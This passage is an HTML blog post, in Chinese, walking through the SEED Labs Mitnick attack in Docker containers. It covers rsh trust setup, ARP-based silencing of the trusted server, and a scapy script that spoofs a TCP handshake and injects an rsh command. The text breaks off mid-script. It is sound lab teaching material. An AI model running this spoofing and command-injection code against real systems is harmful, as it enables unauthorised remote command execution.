@@ -1,0 +1,1756 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="实验环境\r基础环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击机 10.9.0.1 伪造身份并发送攻击报文 X-Terminal 10.9.0.5 受害主机 Trusted Server 10.9.0.6 被受害者信任的服务器 启动实验前先停止并清理容器环境，防止被之前的网络配置干扰\n">
+<title>Mitnick攻击</title>
+
+<link rel='canonical' href='https://th4uma.github.io/post/mitnick/'>
+
+<link rel="stylesheet" href="/scss/style.min.5808d9f960cd3176a76fafd720ebb8e0ace728f0632a73e61bfdce0587bb6582.css"><meta property='og:title' content="Mitnick攻击">
+<meta property='og:description' content="实验环境\r基础环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击机 10.9.0.1 伪造身份并发送攻击报文 X-Terminal 10.9.0.5 受害主机 Trusted Server 10.9.0.6 被受害者信任的服务器 启动实验前先停止并清理容器环境，防止被之前的网络配置干扰\n">
+<meta property='og:url' content='https://th4uma.github.io/post/mitnick/'>
+<meta property='og:site_name' content='Thaumazein&#39;s Shelter'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-05-31T16:24:02&#43;08:00'/><meta property='article:modified_time' content='2026-05-31T16:24:02&#43;08:00'/><meta property='og:image' content='https://th4uma.github.io/images/cover/mitnick.jpg' />
+<meta name="twitter:title" content="Mitnick攻击">
+<meta name="twitter:description" content="实验环境\r基础环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n网络结构如下：\n节点 IP 地址 作用 攻击机 10.9.0.1 伪造身份并发送攻击报文 X-Terminal 10.9.0.5 受害主机 Trusted Server 10.9.0.6 被受害者信任的服务器 启动实验前先停止并清理容器环境，防止被之前的网络配置干扰\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://th4uma.github.io/images/cover/mitnick.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_3258497a308b47ee.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Thaumazein&#39;s Shelter</a></h1>
+            <h2 class="site-description">Keep on Keeping on!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/622057325'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <!--
+tags: [china, platform, streaming, video]
+category: Brand
+version: "2.1"
+unicode: "f6d2"
+-->
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  width="32"
+  height="32"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="#000000"
+  stroke-width="1"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" />
+  <path d="M8 3l2 3" />
+  <path d="M16 3l-2 3" />
+  <path d="M9 13v-2" />
+  <path d="M15 11v2" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Th4uma'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://psnprofiles.com/Thaumazein--'
+                        target="_blank"
+                        title="PSN"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 30 30" width="30px" height="30px">    <path d="M 11.181641 3.7421875 L 11.181641 24.857422 L 15.761719 26.257812 L 15.761719 8.5761719 C 15.761719 8.0671719 15.761625 7.8135937 16.015625 7.5585938 C 16.142625 7.3045937 16.396391 7.3046406 16.650391 7.4316406 C 17.286391 7.6856406 17.669922 8.1948906 17.669922 9.2128906 L 17.669922 16.207031 C 19.195922 16.970031 20.466375 16.970031 21.484375 16.207031 C 22.502375 15.444031 23.011719 14.300578 23.011719 12.392578 C 23.012719 10.357578 22.630234 9.0853594 21.740234 8.0683594 C 20.977234 7.0503594 19.578969 6.1594375 17.542969 5.5234375 C 14.998969 4.7604375 12.835641 4.1241875 11.181641 3.7421875 z M 9.9101562 16.972656 L 4.0585938 19.007812 L 3.1699219 19.388672 C 1.7709219 20.024672 1.0078125 20.660875 1.0078125 21.296875 C 1.1348125 22.059875 1.388875 23.078844 3.296875 23.714844 C 5.077875 24.350844 6.4770625 24.604891 10.039062 23.587891 L 10.039062 21.296875 C 6.6030625 22.440875 6.0949375 22.314547 5.5859375 22.060547 C 5.0769375 21.806547 5.076125 21.550828 5.203125 21.423828 C 5.585125 21.169828 6.984375 20.660156 6.984375 20.660156 L 9.9101562 19.642578 L 9.9101562 16.972656 z M 22.853516 17.962891 C 22.440109 17.948984 22.026781 17.956531 21.613281 17.988281 C 20.214281 17.988281 18.941063 18.243 17.414062 18.625 L 17.414062 21.296875 L 20.212891 20.277344 L 21.738281 19.769531 C 21.738281 19.769531 22.375812 19.642625 22.757812 19.515625 C 23.393812 19.388625 24.15625 19.642578 24.15625 19.642578 C 24.53825 19.642578 24.792969 19.768438 24.792969 20.023438 C 24.919969 20.277438 24.665297 20.406156 24.029297 20.660156 L 22.630859 21.169922 L 17.542969 23.076172 L 17.542969 25.748047 L 19.832031 24.984375 L 26.191406 22.695312 L 26.955078 22.3125 C 28.481078 21.8035 29.117234 21.167297 28.990234 20.404297 C 28.990234 19.642297 28.100219 19.134 26.574219 18.625 C 25.333719 18.24325 24.093734 18.004609 22.853516 17.962891 z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://qm.qq.com/q/86n1mKWhCE'
+                        target="_blank"
+                        title="QQ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-qq"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9.748a14.716 14.716 0 0 0 11.995 -.052c.275 -9.236 -11.104 -11.256 -11.995 .052z" /><path d="M18 10c.984 2.762 1.949 4.765 2 7.153c.014 .688 -.664 1.346 -1.184 .303c-.346 -.696 -.952 -1.181 -1.816 -1.456" /><path d="M17 16c.031 1.831 .147 3.102 -1 4" /><path d="M8 20c-1.099 -.87 -.914 -2.24 -1 -4" /><path d="M6 10c-.783 2.338 -1.742 4.12 -1.968 6.43c-.217 2.227 .716 1.644 1.16 .917c.296 -.487 .898 -.934 1.808 -1.347" /><path d="M15.898 13l-.476 -2" /><path d="M8 20l-1.5 1c-.5 .5 -.5 1 .5 1h10c1 0 1 -.5 .5 -1l-1.5 -1" /><path d="M13.75 7m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M10.25 7m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#实验环境">实验环境</a>
+      <ol>
+        <li><a href="#基础环境">基础环境</a></li>
+        <li><a href="#建立信任关系">建立信任关系</a></li>
+      </ol>
+    </li>
+    <li><a href="#阻断真实服务器">阻断真实服务器</a></li>
+    <li><a href="#伪造-tcp-连接与-rsh-会话">伪造 TCP 连接与 RSH 会话</a>
+      <ol>
+        <li><a href="#修改攻击脚本">修改攻击脚本</a></li>
+        <li><a href="#执行攻击">执行攻击</a></li>
+        <li><a href="#验证攻击结果">验证攻击结果</a></li>
+      </ol>
+    </li>
+    <li><a href="#设置永久后门">设置永久后门</a>
+      <ol>
+        <li><a href="#修改攻击载荷">修改攻击载荷</a></li>
+        <li><a href="#重新执行攻击流程">重新执行攻击流程</a></li>
+      </ol>
+    </li>
+    <li><a href="#实验结论">实验结论</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/mitnick/">
+                
+                    <img src="/images/cover/mitnick.jpg" loading="lazy" alt="Featured image of post Mitnick攻击" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" >
+                计算机网络
+            </a>
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/mitnick/">Mitnick攻击</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-05-31</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="实验环境">实验环境
+</h2><h3 id="基础环境">基础环境
+</h3><p>我使用的是 Ubuntu  24.04.4，基本环境配置见<a class="link" href="https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87"  target="_blank" rel="noopener"
+    >ARP攻击原理学习</a></p>
+<p>网络结构如下：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>节点</th>
+					<th>IP 地址</th>
+					<th>作用</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>攻击机</td>
+					<td><code>10.9.0.1</code></td>
+					<td>伪造身份并发送攻击报文</td>
+			</tr>
+			<tr>
+					<td>X-Terminal</td>
+					<td><code>10.9.0.5</code></td>
+					<td>受害主机</td>
+			</tr>
+			<tr>
+					<td>Trusted Server</td>
+					<td><code>10.9.0.6</code></td>
+					<td>被受害者信任的服务器</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>启动实验前先停止并清理容器环境，防止被之前的网络配置干扰</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker stop $(sudo docker ps -q) 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">sudo docker system prune -f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入实验目录并启动</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd seed-labs/category-network/Mitnick_Attack/Labsetup
+</span></span><span class="line"><span class="cl">sudo docker compose up -d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开三个终端分别进入对应的容器</p>
+<p>攻击者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it seed-attacker /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>受害者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it x-terminal-10.9.0.5 /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>受信任服务器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it trusted-server-10.9.0.6 /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="建立信任关系">建立信任关系
+</h3><blockquote>
+<p>Mitnick 攻击的原理就是利用受害者和服务器的信任关系，因此实验开始前必须先进行配置</p>
+</blockquote>
+<p>在受害者容器中切换到 <code>seed</code> 用户，配置<code>.rhosts</code>文件来信任来自服务器的连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su seed
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">touch .rhosts
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> 10.9.0.6 &gt; .rhosts
+</span></span><span class="line"><span class="cl">chmod <span class="m">644</span> .rhosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>.rhosts</code>是声明当前主机信任哪些远程主机的文件，写入<code>10.9.0.6</code>表示信任来自服务器的远程访问请求</p>
+</blockquote>
+<p>在服务器容器中切换到 <code>seed</code> 用户，用 <code>rsh</code> 远程执行命令获取受害者时间，如果返回正确的受害者系统时间而且不需要输入密码，说明信任关系建立成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su seed
+</span></span><span class="line"><span class="cl">rsh 10.9.0.5 date
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="1.png" style="width: 90%;" />
+<h2 id="阻断真实服务器">阻断真实服务器
+</h2><blockquote>
+<p>攻击的关键是伪造受信任服务器的身份，然后和受害者建立连接。为了防止真实服务器收到伪造包后回复RST关闭连接，攻击者需要让真实服务器暂时无法正常回应。一般会使用 SYN 洪泛攻击让服务器无法处理正常连接</p>
+</blockquote>
+<p>这个实验使用静态 ARP 映射来模拟洪泛攻击效果。首先在受害者容器把 <code>10.9.0.6</code> 映射到一个不存在的 MAC 地址，让受害者发往服务器的报文无法真正到达</p>
+<p>输入<code>exit</code>退出<code>seed</code>进入<code>root</code>，然后输入下面的命令修改受害者的arp缓存</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -s 10.9.0.6 aa:bb:cc:dd:ee:ff
+</span></span><span class="line"><span class="cl">arp -n
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到修改前受害者可以ping通服务器，修改后就全部丢包，之后服务器就无法对实验产生任何干扰了，相当于静默状态</p>
+<img src="2.png" style="width: 90%;" />
+<h2 id="伪造-tcp-连接与-rsh-会话">伪造 TCP 连接与 RSH 会话
+</h2><p>攻击者伪造受信任服务器的 IP 地址，向受害者发起连接，盲猜 TCP 序列号完成握手。连接建立后，再通过 RSH 协议注入命令</p>
+<h3 id="修改攻击脚本">修改攻击脚本
+</h3><p>打开 <code>volumes/spoof_ack_plus_data.py</code>，将注入命令改成创建 <code>/tmp/mitnick</code> 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span>  <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">srv_port2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">seed</span><span class="se">\x00</span><span class="s1">touch /tmp/mitnick</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输入<code>ip addr</code>确认攻击者容器的网卡名，找到 <code>10.9.0.1</code> 对应的网卡，我这里是叫<code>br-302e4ba285b3</code></p>
+<img src="3.png" style="width: 90%;" />
+<p>将所有攻击脚本末尾 <code>sniff()</code> 函数中的 <code>iface</code> 改成实际的网卡名，否则脚本正常运行，但实际上抓不到目标的通信流量</p>
+<h3 id="执行攻击">执行攻击
+</h3><blockquote>
+<p>在攻击机容器中需要开启三个终端，并行运行三个脚本</p>
+</blockquote>
+<p>终端 1 运行 <code>spoof_ack_plus_data.py</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> volumes
+</span></span><span class="line"><span class="cl">python3 spoof_ack_plus_data.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个脚本负责盲猜序列号，伪造 ACK 完成握手，并发送 RSH 命令数据、</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_ip</span>      <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>  <span class="c1"># X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_ip</span>    <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>  <span class="c1"># The trusted server</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_port</span>    <span class="o">=</span> <span class="mi">514</span>         <span class="c1"># Port number used by X-Terminal</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_port</span>  <span class="o">=</span> <span class="mi">1023</span>        <span class="c1"># Port number used by the trusted server</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv_port2</span> <span class="o">=</span> <span class="mi">9090</span>
+</span></span><span class="line"><span class="cl"><span class="n">syn_seq</span>   <span class="o">=</span> <span class="mh">0x1000</span>      <span class="c1"># Initial sequence number</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Spoof the ACK to finish 3-way handshake initiated by the attacker</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># After that, spoof a rsh data packet</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We are only allowed to use the sequence number in the captured packet</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">old_tcp</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">flags</span> <span class="o">==</span> <span class="s1">&#39;SA&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">       <span class="c1"># Spoof ACK to finish the handshake protocol</span>
+</span></span><span class="line"><span class="cl">       <span class="n">ip</span> <span class="o">=</span>  <span class="n">IP</span><span class="p">(</span> <span class="n">src</span>   <span class="o">=</span> <span class="n">srv_ip</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                 <span class="n">dst</span>   <span class="o">=</span> <span class="n">x_ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span> <span class="o">=</span> <span class="n">srv_port</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                 <span class="n">dport</span> <span class="o">=</span> <span class="n">x_port</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">seq</span>   <span class="o">=</span> <span class="n">syn_seq</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                 <span class="n">ack</span>   <span class="o">=</span> <span class="n">old_tcp</span><span class="o">.</span><span class="n">seq</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;  </span><span class="si">{}</span><span class="s1">--&gt;</span><span class="si">{}</span><span class="s1"> Spoofing ACK&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tcp</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">tcp</span><span class="o">.</span><span class="n">dport</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">       <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="c1"># Send rsh command to X-Terminal</span>
+</span></span><span class="line"><span class="cl">       <span class="n">tcp</span><span class="o">.</span><span class="n">flags</span><span class="o">=</span><span class="s2">&#34;PA&#34;</span>
